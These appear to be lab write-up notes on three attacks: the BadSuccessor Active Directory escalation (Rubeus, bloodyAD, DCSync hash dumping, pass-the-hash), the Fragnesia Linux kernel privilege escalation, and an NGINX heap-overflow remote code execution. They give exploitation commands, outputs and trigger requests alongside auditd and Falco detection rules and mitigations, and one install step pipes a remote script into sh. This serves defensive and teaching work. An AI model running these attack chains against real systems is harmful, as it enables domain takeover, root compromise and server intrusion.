- `/ptt` — pass-the-ticket; immediately injects the resulting TGS into the current session.
- `/ticket:` — the base64-encoded TGT obtained from `tgtdeleg`.

This yields a new ticket for `pentest_dmsa$`.

**Step 4 — Request a service ticket with Administrator context:**

```powershell
.\Rubeus.exe asktgs /user:pentest_dmsa$ /service:cifs/DC-LAB2025-01.tryhackme.local /opsec /dmsa /nowrap /ptt /ticket:doIGLjCCB..
```

- `/user:pentest_dmsa$` — the account being impersonated.
- `/service:cifs/DC-LAB2025-01.tryhackme.local` — SPN for the SMB/CIFS service on the target, specifying exactly which service/host access is being requested.

**Step 5 — Verify access to the Domain Admin's desktop:**

```powershell
PS C:\PoC> dir \\DC-LAB2025-01.tryhackme.local\c$\Users\Administrator\Desktop\

    Directory: \\DC-LAB2025-01.tryhackme.local\c$\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/29/2025   9:02 AM            251 flag.txt
```

Full read access to the Administrator's desktop confirms successful privilege escalation.

#### Exploitation Using Linux

The same attack can be performed from a Linux machine (e.g. Kali) using **bloodyAD** (v2.1.18+) and **Impacket**.

**Setting up bloodyAD** — via `uv` (astral-sh):

```bash
curl -LsSf https://astral.sh/uv/install.sh | sh
```

```bash
uv tool install --python 3.13 git+https://github.com/CravateRouge/bloodyAD
```

- `--python 3.13` avoids dependency errors by pinning the environment.
- If installation hangs, `CTRL+C` and re-run the command.

> Impacket scripts are located at `/opt/impacket/examples/` on the AttackBox.

**Step 1 — Configure DNS resolution** via `/etc/hosts`:

```
127.0.0.1       localhost
127.0.1.1       kali
10.211.101.10   DC-LAB2025-01.tryhackme.local tryhackme tryhackme DC-LAB2025-01
```

**Step 2 — Check writable permissions:**

```bash
bloodyAD -d tryhackme.local -u 'tbyte' -p 'P@SSw0rd345' --host DC-LAB2025-01.tryhackme.local get writable --detail
```

- `-d` — domain.
- `-u` / `-p` — credentials.
- `--host` — FQDN of the domain controller.
- `get writable --detail` — lists writable attributes for the authenticating account.

```
distinguishedName: OU=LabOU,DC=tryhackme,DC=local
device: CREATE_CHILD
ipNetwork: CREATE_CHILD
organizationalUnit: CREATE_CHILD
...
dSA: CREATE_CHILD
ipsecISAKMPPolicy: CREATE_CHILD
...
```

`dSA: CREATE_CHILD` on `LabOU` confirms dMSA-creation rights.

**Step 3 — Create the dMSA via the BadSuccessor attack:**

```bash
bloodyAD -d tryhackme.local -u 'tbyte' -p 'P@SSw0rd345' --host DC-LAB2025-01.tryhackme.local add badSuccessor pentest2_dmsa
```

`add badSuccessor pentest2_dmsa` creates the dMSA object (impersonating Administrator by default):

```
[*] Creating DMSA pentest2_dmsa$ in OU=LabOU,DC=tryhackme,DC=local
[*] Impersonating: CN=Administrator,CN=Users,DC=tryhackme,DC=local
...
[+] dMSA TGT stored in ccache file pentest2_dmsa_ts.ccache

dMSA current keys found in TGS:
AES256: 0554f7dc79121dc1a38e639c90accae967fc37a26547445b8dab8771f619f177
AES128: 6cac5029502e1e1b2faef14942b3ce36
RC4: 848acc28b6855bcf16625d76deb38ebb

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: 984f755c74dda5d1ec46091043976fec
```

A ccache file holding Kerberos credentials is created automatically.

**Step 4 — Request a service ticket via Impacket's `getST.py`:**

```bash
export KRB5CCNAME=pentest2_dmsa_ts.ccache
python3 /opt/impacket/examples/getST.py -dc-ip 10.211.101.10 -spn 'cifs/DC-LAB2025-01.tryhackme.local' 'tryhackme.local/pentest2_dmsa$' -k -no-pass
```

- `-dc-ip` — the domain controller's IP.
- `-spn` — the target Service Principal Name.
- `tryhackme.local/pentest2_dmsa$` — domain/account to log in with.
- `-k -no-pass` — use Kerberos authentication with no password prompt (`-k` reads from `KRB5CCNAME` if no credentials given).

```
[*] Getting ST for user
[*] Saving ticket in pentest2_dmsa$.ccache
```

**Step 5 — DCSync attack via Impacket's `secretsdump.py`:**

```bash
export KRB5CCNAME=pentest_dmsa$.ccache
python3 /opt/impacket/examples/secretsdump.py -k -no-pass 'pentest2_dmsa$'@DC-LAB2025-01.tryhackme.local
```

Extracts all domain NTLM hashes, including:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:984f755c74xxxxxxxxxxxxxx43976fec:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:52c43c39a2e4a1bef1cf81e06dbc9e06:::
...
```

**Step 6 — Pass-the-hash as Administrator via Impacket's `wmiexec.py`:**

```bash
python3 /opt/impacket/examples/wmiexec.py 'tryhackme.local/administrator@10.211.101.10' -hashes :984f755c74xxxxxxxxxxxxxx43976fec
```

- `'tryhackme.local/administrator@10.211.101.10'` — target domain/user/IP.
- `-hashes :<NTLM hash>` — the Administrator's NTLM hash for authentication.

```
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
C:\>whoami
tryhackme\administrator

C:\>hostname
DC-LAB2025-01
```

Full interactive access as `tryhackme\administrator` on the domain controller — complete domain compromise from a single low-privileged user with dMSA-creation rights on one OU.

> [!summary] Quick Recap — AD: BadSuccessor
> 
> - **dMSA** (Windows Server 2025+) is admin-managed and scoped to a specific server — unlike gMSA (AD-managed, multi-server); it supports migrating a legacy service account onto a machine account
> - **BadSuccessor**: whoever **controls a dMSA object** (existing or newly created) can succeed/impersonate _any_ account, including Domain Admin
> - Recon: `Get-BadSuccessorOUPermissions.ps1` finds accounts with `CreateChild`/`GenericAll`/`WriteDACL`/`WriteOwner` over OUs — that's the entry condition for the attack
> - **Windows exploitation chain**: `SharpSuccessor.exe add` (weaponize a new dMSA, choose who to impersonate) → `Rubeus tgtdeleg` (steal your own TGT via unconstrained-delegation trick) → `Rubeus asktgs .../dmsa /ptt` (impersonate the dMSA for a krbtgt TGS) → `asktgs` again for a **CIFS** service ticket against the DC → full filesystem access as Administrator
> - **Linux exploitation chain**: `bloodyAD get writable --detail` (confirm `CREATE_CHILD` on the OU) → `bloodyAD add badSuccessor <name>` (creates dMSA + TGT ccache in one step) → Impacket `getST.py` (service ticket) → Impacket `secretsdump.py` (DCSync — dump all domain NTLM hashes) → Impacket `wmiexec.py` (pass-the-hash as Administrator)
> - Both platforms converge on the same core idea: one write privilege on **one OU** is enough to escalate to **full domain compromise**, because dMSA creation lets you choose who the new account "succeeds"
> - Key Rubeus flags worth remembering: `/opsec` (avoid RC4/ticket-reuse, EDR-friendlier), `/dmsa` (Kerberos protocol path for managed service account context), `/ptt` (pass-the-ticket, no manual save/replay needed)
### CVE-2026-46300: Fragnesia

#### Intro

**Fragnesia** is the third Linux kernel local privilege escalation vulnerability in the page-cache write class disclosed in under three weeks. Reported by **William Bowling (Zellic)** using V12, Zellic's AI-agentic security auditing tool. Assigned **CVE-2026-46300** with **CVSS v3.1 base score of 7.8 (High)**. Public disclosure **13 May 2026** with working PoC and upstream patch candidate.

**What makes Fragnesia notable:** not the primitive itself (familiar from **Copy Fail** and **Dirty Frag**), but _how it came into existence_. The **Dirty Frag patch** (commit `f4c50a4034e6`, merged 8 May 2026) added code trusting a particular socket buffer flag to be accurate. **That flag is not always accurate.** Fragnesia is the vulnerability the Dirty Frag _fix_ introduced. **Hyunwoo Kim** (original Dirty Frag reporter) publicly acknowledged Fragnesia emerged as an unintended side effect of one of his patch remediations.

**Key distinction:** Same broad attack surface as Dirty Frag (XFRM, ESP, page cache), but different code path. Original Dirty Frag bugs were in `esp_input()` and `rxkad_verify_packet_1()`; Fragnesia is in `skb_try_coalesce()` (socket buffer merging). The published PoC covers **espintcp** only; a **second variant in `skb_segment()`** was disclosed the day after (15 May), and **remains unpatched** as of room publication.

|Property|Copy Fail|Dirty Frag|Fragnesia|
|---|---|---|---|
|CVE|CVE-2026-31431|CVE-2026-43284 / 43500|CVE-2026-46300|
|Kernel subsystem|AF_ALG / splice|xfrm-ESP UDP / RxRPC|xfrm-ESP-in-TCP / skb coalescing|
|Write primitive size|4 bytes|4 bytes (ESP) / 8 bytes (RxRPC)|1 byte (per trigger)|
|Race condition required|No|No|No|
|Container escape impact|Yes|Yes|Yes|
|Patch state|Mainline|xfrm-ESP mainline; RxRPC unpatched|First variant on netdev; second variant unpatched|

The **1-byte write primitive is deterministic**: each trigger writes one chosen byte at one chosen offset in the page cache. A 192-byte ELF stub is delivered across ~176 triggers (some bytes coincidentally match /usr/bin/su's existing ELF header), completing in a few hundred milliseconds.

#### How a Patch Becomes Vulnerable

Fragnesia involves **five components**: four existed before Dirty Frag; the fifth is what Dirty Frag added.

**SKBFL_SHARED_FRAG: The Honesty Flag**

A socket buffer (`struct sk_buff`) carries an array of fragments, each describing a memory page. Most fragments are private buffers owned by the network stack; some are references to pages belonging to other subsystems (commonly the page cache). When `splice()` sends file contents through a socket, the kernel attaches a reference to the file's page-cache page directly to the outgoing skb's fragment list **without copying bytes**.

**`SKBFL_SHARED_FRAG`** is the kernel's marker for externally-owned fragments, telling downstream code: _"this memory does not belong to you; if you need to modify it, copy it first."_ Functions checking `skb_has_shared_frag()` call `skb_cow_data()` to obtain a private buffer before mutation. The flag is an **invariant** — as long as every code path respects it, page-cache pages stay safe.

**skb_try_coalesce: Where the Invariant Breaks**

`skb_try_coalesce()` merges two skbs into one, used by the TCP receive stack to combine queued segments into larger buffers (reducing memory overhead, improving throughput). When coalescing, the second skb's fragments are transferred onto the first skb's fragment array, and the second skb is freed.

**The bug:** `skb_try_coalesce()` does **not propagate** the `SKBFL_SHARED_FRAG` marker when transferring fragments. The coalesced skb carries fragments still backed by the page cache, but with the flag **cleared**. To every downstream code path, it now looks like a perfectly ordinary private buffer that can be modified in place.

The bug was introduced in **2013** (commit `cef401de7be8`) and **sat dormant for thirteen years** — no production code path examined coalesced skbs and decided to write to them. The Dirty Frag patch changed that.

**The XFRM ESP-in-TCP Receive Path**

**ESP-in-TCP** (RFC 8229) is IPsec transport mode encapsulating ESP packets inside TCP (for NAT traversal where UDP-based ESP fails). When a TCP socket is configured for espintcp via `setsockopt`, the kernel switches the socket's Upper Layer Protocol (ULP) handler to pull ESP packets from the TCP byte stream and feed them to `esp_input()`.

`esp_input()` performs AEAD decryption on the incoming payload, writing plaintext back into the skb. For performance, decryption is **in-place** when the input skb is uncloned and has no frag list. The function calls `skb_has_shared_frag()` to verify no fragments are externally backed. If the flag is clear, it takes the fast path; if set, it falls back to `skb_cow_data()`.

**The Dirty Frag patch added exactly this check.** Before, the function didn't always honour the flag. After, it does. The patch was correct — **the flag, however, is no longer trustworthy after `skb_try_coalesce()` strips it.**

**The Combination That Becomes Fragnesia**

```
1. Attacker opens TCP socket, splices /usr/bin/su page cache pages
   into socket's receive queue (skbs flagged SKBFL_SHARED_FRAG).
2. Kernel coalesces skbs via skb_try_coalesce(); flag is lost.
3. Attacker calls setsockopt(TCP_ULP, "espintcp") to switch to
   ESP-in-TCP mode. Queued data now processed as ESP ciphertext.
4. esp_input() checks the (now-clear) shared-frag flag, takes fast
   path, performs AES-GCM decryption in place over page cache page.
5. Decryption is XOR of AES-GCM keystream against ciphertext. By
   choosing IV, attacker chooses keystream byte, choosing the byte
   written into page cache.
```

The name **"Fragnesia"** (fragment + amnesia) captures it: the socket buffer _forgets_ its fragment was shared.

**Why Corruption Becomes Host Root**

The corruption sits in the kernel's **global page cache**, shared between every process regardless of namespace. The attacker performs corruption from inside a user namespace where they're namespace-root, but corrupted bytes are visible to _any_ process reading that file, including privileged processes outside the namespace.

Privilege escalation completes when a setuid-root binary like `/usr/bin/su` is executed from outside the namespace. The kernel loads the binary from the corrupted page cache, sees the setuid bit on the on-disk file, sets effective UID to 0, then executes the attacker's shellcode under that UID. The shellcode calls `setuid(0)` (promotes to real UID 0), then `execve("/bin/sh")` (spawns a host-root shell).

This two-stage pattern is critical for the practical exploit. The published PoC performs only stage one (the corruption) from inside the namespace, producing a shell that appears root via `whoami` but can't read root-owned files (it's namespace-root, not host-root). Stage two — executed _outside_ the namespace on the corrupted binary — produces the usable host-root shell.

**The 1-Byte Write Primitive**

Each AES-GCM decryption produces a **one-byte controlled write** at one chosen offset. The attacker controls the byte by varying the **lower 32 bits of the 8-byte IV**. Encrypting the counter block under the known AES-128-GCM key yields a 16-byte keystream; only byte 0 is used. By iterating the IV through up to 65,536 values, all 256 possible byte values are reachable.

The exploit pre-computes a 256-entry IV-lookup table mapping target bytes to the IVs producing them. Each write is a single trigger completing in microseconds. The PoC overwrites the first 192 bytes of `/usr/bin/su` with a small ELF stub calling `setgid(0); setuid(0); execve("/bin/sh", ...)` at its entry point. The per-byte loop skips bytes whose current value already matches the desired stub — on a typical Linux system, ~16 bytes coincide (ELF header), so ~176 actual triggers run, completing in a few hundred milliseconds.

**The on-disk file is never touched.** File integrity tools hashing from disk continue to report the file as clean — identical to Copy Fail and Dirty Frag.

#### The Patch That Became the Vulnerability

**The Dirty Frag Patch**

The original Dirty Frag xfrm-ESP bug (`CVE-2026-43284`) was that `esp_input()` took a fast path skipping `skb_cow_data()` for any uncloned, non-linear skb with no frag list. The fast path was unsafe because skb fragments could be backed by page-cache pages planted via `splice()`.

The patch (commit `f4c50a4034e6`) added two pieces:

1. IPv4/IPv6 datagram append paths updated to set `SKBFL_SHARED_FRAG` on splice'd fragments.
2. `esp_input()` updated to check `skb_has_shared_frag()` before taking the fast path.

Reasoning was correct, implementation was correct, and the patch closed the original Dirty Frag bug as intended. **What it did not do:** audit every code path touching `SKBFL_SHARED_FRAG` to verify it preserved the flag. `skb_try_coalesce()` was one such path — already existed since 2013, already incorrectly stripping the flag for thirteen years. Until Dirty Frag, no production code made a critical decision based on the flag, so the bug was **latent**. After Dirty Frag, `esp_input()` started making exactly that decision.

The candidate Fragnesia patch carries **two `Fixes:` tags**: one pointing at Dirty Frag (`f4c50a4034e6`), one at the original `skb_try_coalesce()` commit (`cef401de7be8`). Two stories in two lines: the **immediate trigger** and the **latent precondition**.

**The Patch Series**

The candidate Fragnesia patch (`f84eca581739`, on netdev since 13 May 2026) is a **two-line change to `skb_try_coalesce()`**: when transferring paged fragments, propagate `SKBFL_SHARED_FRAG` from source to destination. The invariant `esp_input()` depends on is restored.

The full series is larger than the headline fix suggests — beyond the core `skb_try_coalesce()` repair, it includes:

- Flag-propagation fix in `pskb_copy()`
- XFRM change to avoid in-place decrypt on shared skb fragments
- Follow-up rxrpc fixes (DATA/RESPONSE packet unsharing, RESPONSE re-decryption, rxkad alignment, memory leaks, potential use-after-free)

The large follow-up series indicates the bug class is **broader than any single bug.** The same audit should be repeated for **every function transferring fragments between skbs** — any function stripping the flag is potentially another Fragnesia waiting for a downstream consumer.

**The Second Variant**

On **15 May 2026**, two days after initial disclosure, the same V12 researcher published a **second variant** bypassing the merged fix via `skb_segment()` instead of `skb_try_coalesce()`. This function propagates `SKBFL_SHARED_FRAG` only from the head skb when building GSO segments, so frag_list members carrying page-cache-backed fragments with the flag set produce segment skbs that **lose the marker**.

Triggering requires three network namespaces connected by veth pairs and is **less reliable** than the first (depends on GRO coalescing two segments in the same NAPI poll). **As of publication, the second variant has no merged fix.**

**Operational point:** Fragnesia is unlikely to be the last vulnerability of its shape. The bug class is **invariant violations on `SKBFL_SHARED_FRAG`.** Every function in the kernel's skb plumbing transferring fragments is a candidate location for the next instance. Dirty Frag took 9 and 6 years respectively to find; Fragnesia took **5 days** from its introducing commit — discovery rate has shifted, partly attributed to agentic AI-assisted auditing. Defenders should treat kernel patches in this subsystem as **changes to the attack surface, not completed mitigations.**

#### Exploitation

**Lab credentials:** `karen` / `fragnesia2026` (SSH access)

**Stage 1: Corrupt the Page Cache** (inside user namespace)

1. `id` — confirm unprivileged context (UID 1001).
2. `cd /home/karen/fragnesia && gcc -O2 -w fragnesia.c -o exp` — build the PoC.
3. `./exp` — runs the exploit:
    - Creates user + network namespace, mapping karen to UID 0 inside
    - Sets up XFRM ESP-in-TCP state with known AES-128-GCM key
    - Splices `/usr/bin/su` page-cache pages into TCP socket
    - Coalesces skbs (losing `SKBFL_SHARED_FRAG` flag)
    - Activates espintcp ULP → `esp_input()` takes fast path
    - AES-GCM decryption in-place over page cache, overwriting first 192 bytes with ELF stub
    - Output shows `[+] BUG: changed requested copied byte range to desired values`
    - Spawns shell as "namespace-root" (UID 0 inside namespace, but not host UID 0)
4. `whoami` — returns `root` (namespace-root, not host-root yet)
5. `cat /root/flag.txt` — returns `Permission denied` (namespace can't read host-owned files)
6. `exit` — exit the namespace, return to karen's regular shell (UID 1001)

**Stage 2: Trigger Corruption from Outside Namespace** (host-level setuid execution)

1. `karen@...$` — back outside namespace as UID 1001
2. `/usr/bin/su` — execute the corrupted setuid binary:
    - Kernel sees setuid bit on on-disk file, honors it, sets effective UID to 0 (host UID 0)
    - Kernel loads `/usr/bin/su` bytes from page cache (still corrupted)
    - Corrupted ELF stub runs under effective UID 0
    - Shellcode calls `setgid(0)`, then `setuid(0)` (effective UID already 0, so this sets _real_ UID to 0)
    - Shellcode calls `execve("/bin/sh", ...)`, spawning a **real host-root shell**
3. `whoami` — now returns genuine `root`
4. `id` — now returns `uid=0(root) gid=0(root) groups=0(root)` (all real host identities)
5. `cat /root/flag.txt` — readable, since process is now genuinely host UID 0
6. `sha256sum /usr/bin/su` — hash matches clean disk copy (only page cache was modified, disk never touched)
7. `sudo sh -c 'echo 3 > /proc/sys/vm/drop_caches'` — clean up corrupted pages before leaving

#### Detection and Mitigation

**Detection**

The exploit's signature is a sequence of syscalls no legitimate app produces:

- `unshare(CLONE_NEWUSER | CLONE_NEWNET)` + writes to `/proc/self/uid_map`
- `socket(AF_ALG, ...)` for keystream lookup table
- `socket(AF_INET, SOCK_STREAM)` followed by `setsockopt(SOL_TCP, TCP_ULP, "espintcp")`
- `splice()` from a setuid binary fd into the same TCP socket
- Burst of `XFRM_MSG_NEWSA` netlink messages with a known AES-128-GCM key
- `execve("/usr/bin/su", ...)` with resulting process at effective UID 0

**The highest-fidelity single signal:** `setsockopt(TCP_ULP = "espintcp")` — legitimate use is rare (primarily strongSwan NAT-traversal setups). A process outside that small daemon set issuing this setsockopt is unusual; the same process issuing it _and_ splicing a setuid binary into the socket is exploitation.

**auditd rules:**

```
-a always,exit -F arch=b64 -S setsockopt -F a0!=-1 -k fragnesia_setsockopt
-a always,exit -F arch=b64 -S unshare -F a0=0x10000000 -k fragnesia_unshare
-a always,exit -F arch=b64 -S splice -k fragnesia_splice
```

**Falco rule** detecting espintcp ULP after splice from setuid binary:

```yaml
- list: setuid_binaries
  items: [/usr/bin/su, /bin/su, /usr/bin/sudo, /usr/bin/passwd, /usr/bin/chsh]
- macro: espintcp_legitimate_processes
  condition: >
    proc.name in (charon, charon-systemd, pluto, swanctl)
- rule: Potential Fragnesia exploit (espintcp ULP after splice)
  condition: >
    (evt.type = splice and fd.name in (setuid_binaries)) or
    (evt.type = setsockopt and evt.arg.optname = TCP_ULP and
     not espintcp_legitimate_processes)
  priority: CRITICAL
  tags: [host, exploit, privilege_escalation, cve_2026_46300]
```

**Mitigation: Modprobe Denylist** (same as Dirty Frag)

```bash
sudo sh -c 'printf "install esp4 /bin/false\ninstall esp6 /bin/false\ninstall rxrpc /bin/false\n" > /etc/modprobe.d/dirtyfrag.conf'
sudo rmmod esp4 esp6 rxrpc 2>/dev/null
sudo sh -c 'echo 3 > /proc/sys/vm/drop_caches'
```

Verify the block:

```bash
sudo modprobe esp4  # Should error; module is blocked
```

Re-run the exploit — it fails when espintcp ULP setsockopt is rejected (esp4 module unavailable).

**Warning:** The denylist breaks legitimate IPsec ESP and AFS RxRPC use. Production hosts running strongSwan, libreswan, or AFS clients need a **patched kernel instead**. For dev/lab environments and most server workloads not using these protocols, the denylist is safe. Organisations that applied the Dirty Frag modprobe denylist are already protected against Fragnesia; organisations that applied _only_ the Dirty Frag kernel patch are **not** (Fragnesia is a separate fix).

> [!summary] Quick Recap — CVE-2026-46300: Fragnesia
> 
> - **The lesson:** a kernel patch meant to _close_ an attack surface inadvertently opened a different path in the same subsystem five days later — patch status != vulnerability status
> - **Root cause chain:** `skb_try_coalesce()` (2013) strips `SKBFL_SHARED_FRAG` on fragments → Dirty Frag patch makes `esp_input()` trust that flag → no trust = in-place AES-GCM decrypt over page cache
> - **1-byte write primitive:** iterate IV across 65,536 values, pre-compute IV→byte lookup table, splice /usr/bin/su into TCP receive queue, coalesce (lose flag), activate espintcp ULP, 176 triggers (~192 bytes), page cache corrupted in milliseconds
> - **Two-stage exploitation**: stage 1 corrupts page cache from inside user namespace (namespace-root shell, can't read host files); stage 2 executes corrupted binary outside namespace (setuid execution as host-root), complete takeover
> - **Detection:** espintcp ULP (`setsockopt(TCP_ULP, "espintcp")`) is the highest-fidelity signal (rare legitimate use); combined with `splice()` from setuid binary fd = exploitation; auditd/Falco rules straightforward
> - **Mitigation:** modprobe denylist (`install esp4/esp6/rxrpc /bin/false`) blocks the chain; same denylist as Dirty Frag, so orgs that applied that are already protected; patched kernels needed for production IPsec/AFS deployments
> - **Operational pattern:** treat kernel patches as attack-surface changes, not closure — the bug class (invariant violations on `SKBFL_SHARED_FRAG` in fragment-transfer functions) is broader, and the second variant (skb_segment) was unpatched within days of disclosure
### CVE-2026-42945: Nginx Rift

#### Intro

**CVE-2026-42945** is a heap overflow vulnerability in **NGINX** caused by a **state-mismatch bug** in the script engine's two-pass evaluation model. The vulnerability arises not from a parsing error or logic flaw, but from one engine instance being reset while another isn't, causing a single boolean flag to silently change the meaning of a downstream length calculation.

The vulnerability class is **older than the eighteen years** it has lived in the NGINX codebase — equivalent two-pass length-then-copy patterns occur in many performance-oriented C codebases (HTTP parsers, RPC frameworks, database query builders), and historical CVE feeds show close cousins in each.

This room walks through the state mismatch that triggers the overflow, the heap feng shui technique converting it to code execution, and the configuration-level workaround.

#### Rewrite and Set Directives

Two **NGINX directives** at the centre of CVE-2026-42945: `rewrite` and `set`. Both are routine production configuration building blocks with well-defined, documented behaviour.

**`rewrite` directive** — modifies the request URI based on regex match. When NGINX matches a request URI against the pattern, it replaces the URI with a new string:

```nginx
location ~ ^/api/(.*)$ {
    rewrite ^/api/(.*)$ /v2/api/$1;
}
```

A request for `/api/users/42` is rewritten internally to `/v2/api/users/42`. The string `$1` is a regex back-reference to the first parenthesised group. NGINX supports standard PCRE capture syntax; captures are unnamed by default (`$1`, `$2`, etc.).

**Critical subtlety:** if the replacement string contains a `?`, NGINX treats everything after it as a new query string and **discards the original arguments**. The replacement `/internal?migrated=true` rewrites the path to `/internal` and replaces the query string with `migrated=true` — the documented way to drop/rewrite query parameters during URL canonicalisation.

**`set` directive** — assigns a value to a custom variable maintained for the lifetime of the request. The value can be a constant, another variable, or a back-reference to the most recently evaluated regex. Variables are typically used to preserve info otherwise lost across a rewrite:

```nginx
location ~ ^/api/(.*)$ {
    rewrite ^/api/(.*)$ /v2/api/$1;
    set $original_endpoint $1;
}
```

The `set` directive runs **after** the `rewrite`, and the back-reference `$1` still refers to the capture from the regex evaluated against the original `/api/(.*)$` path. The chain performs two related operations against the same capture group in a documented, supported order.

**Under the surface:** NGINX does not interpret either directive at request time — both are compiled at config load into a sequence of operations executed by an **internal script engine**. At runtime, the engine walks the compiled operations in a **two-pass process**:

1. **First pass** — calculates the total length of the final output string so the engine can allocate exactly the right amount of memory from its per-request pool.
2. **Second pass** — writes the actual data into that buffer.

The design is performant (avoids repeated small allocations) but depends on the length calculation in the first pass **matching the data written in the second pass exactly**. The state mismatch that breaks this assumption is the root cause.

#### The Two-Pass Script Engine and the State Mismatch

The root cause is a **single internal flag** the script engine sets in one pass and reads in the other, despite the two passes running against **different engine instances**. The flag is **`is_args`** (defined on `struct ngx_http_script_engine_t`), indicating whether the engine is currently writing into the query-string portion of a URL — and controlling whether captured values are **URI-escaped** before being written.

**How the mismatch unfolds:**

When a `rewrite` replacement string contains a `?`, the compiled bytecode includes a call to `ngx_http_script_start_args_code`. That function sets `e->is_args = 1` on the main script engine. **The flag is never explicitly reset** before subsequent compiled directives execute. For `rewrite` followed by `set`, the main engine carries `is_args = 1` into evaluation of the `set` directive.

The `set` directive uses a **separate path** when its RHS references a regex capture. The relevant function is `ngx_http_script_complex_value_code`, which executes the length-calculation pass against a **fresh, fully zeroed sub-engine** (named `le`). This prevents earlier state from polluting the length calculation. **The actual copy pass, however, still runs on the main engine `e`, with `is_args` unchanged.**

**The decision to escape or not escape** is made by:

- `ngx_http_script_copy_capture_len_code` (length pass)
- `ngx_http_script_copy_capture_code` (copy pass)

Both check the same condition before deciding whether to call `ngx_escape_uri`. The condition combines the engine's `is_args` flag with whether the request URI contained escapable characters.

**During the length pass:** `le.is_args` is zero (sub-engine was zeroed). The condition evaluates false, the function takes the simple path, and returns the **unescaped capture length** — raw bytes in the captured substring.

**During the copy pass:** `e->is_args` is still one (main engine never reset). The condition evaluates true, the function takes the URI-escaping path, and writes the **escaped** capture into the buffer.

**For URI-safe characters:** escaping leaves them untouched, so both passes produce the same bytes and the mismatch goes unnoticed.

**For escapable characters:** escaping replaces each character with its three-byte `%xx` percent-encoded form. The plus sign (`+`) escapes to `%2B`. If the captured substring contains `N` escapable characters, the **copy pass writes `raw_size + 2 * N` bytes** into a buffer allocated for only `raw_size` bytes — a **deterministic, attacker-controlled overflow** on the NGINX worker's memory pool.

**Trigger configuration:**

```nginx
location ~ ^/api/(.*)$ {
    rewrite ^/api/(.*)$ /internal?migrated=true;
    set $original_endpoint $1;
}
```

The `rewrite` replacement contains `?`, so `is_args` is set on the main engine. The `set` directive references unnamed capture `$1`, so it routes through `ngx_http_script_complex_value_code` and the mismatch fires. If the client request URI contains plus signs (or other URI-escapable characters) in the captured part, they're counted as one byte by the length pass and three bytes by the copy pass.

**Exploit trigger request:**

```http
GET /api/+++++++++++++...+++++++++++++ HTTP/1.1
Host: localhost
```

For 2,000 plus signs in the capture: length pass reserves 2,000 bytes, copy pass writes 6,000 bytes. The 4,000-byte difference is written past the end of the allocated pool chunk, into whatever adjacent heap memory is placed next to it.

**Second restriction:** overflow bytes pass through `ngx_escape_uri`, which only emits **ASCII bytes valid in a URI**. Null bytes, control characters, and any byte outside the URI-safe set cannot be written. An attacker must construct any binary payload (including pointers) through other means.

#### From Heap Overflow to Code Execution

A heap overflow alone is not code execution. To turn it into a useful primitive, an attacker must overwrite something the worker process will later **use as a pointer** — ideally a function pointer. NGINX's memory management offers a convenient target.

NGINX allocates memory through **per-request memory pools** (`ngx_pool_t` structure). Each pool tracks an allocation cursor, a chain of large allocations, and a **linked list of cleanup callbacks** — the relevant field. Each entry is a `ngx_pool_cleanup_t` containing:

- `handler` — function pointer
- `data` — argument pointer

When the pool is destroyed, NGINX walks the list and calls `handler(data)` for each entry. **If an attacker controls the cleanup list, they control both the function pointer and the argument** — `system()` with an attacker-supplied command string is the natural choice.

**The corruption challenge:** the `cleanup` pointer sits at **offset 64** inside `ngx_pool_t`, after several earlier fields. A contiguous heap overflow from a preceding pool corrupts all those earlier fields on the way to the cleanup pointer. If the corrupted pool is used again for any allocation, network read, or further request processing, NGINX dereferences one of the corrupted fields and the worker **crashes before reaching the cleanup phase**.

**The exploitation primitive** must corrupt the cleanup pointer _and_ trigger the pool's destruction **immediately**, before any other corrupted fields are touched. This is **cross-request heap feng shui** — arranging pool layout and lifecycle ordering via a careful sequence of HTTP connections.

**Exploitation sequence (four stages):**

1. **Attacker opens connection #1**, sends **only partial HTTP headers** → NGINX allocates a request pool but doesn't start processing
2. **Attacker opens connection #2** immediately → pool allocator places connection #2's pool **directly adjacent** to connection #1's
3. **Attacker completes headers of connection #1** in a way that **triggers the rewrite overflow** → overflow runs out of pool #1 into the header of adjacent pool #2
4. **Attacker closes connection #2** → NGINX calls `ngx_destroy_pool` on the corrupted pool → destroy path walks cleanup list without touching other corrupted fields → worker calls attacker's chosen handler with attacker's chosen argument, without crashing

**Second restriction circumvented:** overflow bytes are URI-escaped, so any value written into the cleanup pointer must consist entirely of **URI-safe bytes** — an attacker cannot write a fully arbitrary 64-bit pointer in a single overflow. The published PoC works around this in two ways:

1. **Deterministic heap layout** across worker restarts (each worker inherits parent's address space layout) → sprayed structure locations are predictable
2. **Spray many fake `ngx_pool_cleanup_t` structures** using HTTP POST request bodies (unlike URIs/headers, POST bodies are forwarded as raw bytes without escaping, so they can contain real binary pointers including null bytes)

The spray populates the worker's heap with thousands of fake cleanup structures at predictable offsets. The attacker **repeatedly retries the exploit**, each time using a different low-byte overwrite to redirect the cleanup pointer until it lands on one of the sprayed structures. Combination of deterministic layout, respawning workers, and many sprayed candidates means convergence is quick.

**Two important assumptions:**

1. **ASLR must be disabled** at the OS level for RCE as published. With ASLR enabled, base addresses change and sprayed pointers must be discovered first (theoretical via pointer leak, but not implemented in the PoC).
2. **Overflow is a reliable DoS even with ASLR enabled** — any matching request with a long run of escapable characters corrupts the heap and crashes a worker; a loop of such requests keeps NGINX in constant restart and effectively takes the server offline.

#### Exploitation

**Lab setup:** NGINX target runs on port `19321` (reachable at `http://127.0.0.1:19321/` on VNC desktop or `http://MACHINE_IP:19321/` remotely).

**Step 1 — Confirm container running:**

```bash
sudo docker ps --filter label=com.docker.compose.project=nginx-rift
```

Should show container `nginx-rift-nginx-1` with port `19321/tcp` mapped.

Verify target is responsive:

```bash
curl -s "http://127.0.0.1:19321/api/users/42"
```

Normal request to vulnerable `location` returns `200` with rewritten URI.

**Step 2 — Run PoC single-command mode:**

```bash
time python3 poc.py --cmd 'echo hello from depthfirst > /tmp/pwned'
```

Successful exploitation prints `crashed - system("...") executed`, typically within 30 seconds to 2 minutes (PoC iterates through hardcoded heap-offset candidates, retrying each up to 10 times; master respawn loop hides individual failures).

Verify command ran:

```bash
sudo docker exec nginx-rift-nginx-1 cat /tmp/pwned
```

File contents should be `hello from depthfirst` (owned by `root` since cleanup handler runs as root).

